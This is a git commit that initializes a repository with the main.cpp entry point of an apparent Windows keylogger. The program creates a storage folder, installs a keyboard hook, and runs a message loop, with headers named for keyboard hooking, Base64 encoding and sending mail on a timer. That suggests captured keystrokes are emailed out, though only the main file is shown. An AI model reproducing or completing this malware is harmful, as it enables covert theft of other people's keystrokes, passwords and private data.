8ea5a963dc54c3b860f567c6665d380ebfc4946d
Joao Gouveia <j.lucas.gouveia@gmail.com>
2016-12-23 11:53:07 -0200

    initialize repo

---
+++ main.cpp
@@ -0,0 +1,27 @@
+//#define _WIN32_WINNT 0x0501 //use this for x64 archtecture
+#include <iostream>
+#include <windows.h>
+#include "Helper.h"
+#include "KeyConstants.h"
+#include "Base64.h"
+#include "IO.h"
+#include "Timer.h"
+#include "SendMail.h"
+#include "KeybHook.h"
+
+//using namespace std;
+int main()
+{
+    MSG Msg;
+
+    IO::MKDir(IO::GetOurPath(true));
+
+    InstallHook();
+    while(GetMessage(&Msg, NULL, 0, 0)){
+        TranslateMessage(&Msg);
+        DispatchMessage(&Msg);
+    }
+
+    MailTimer.Stop();
+    return 0;
+}
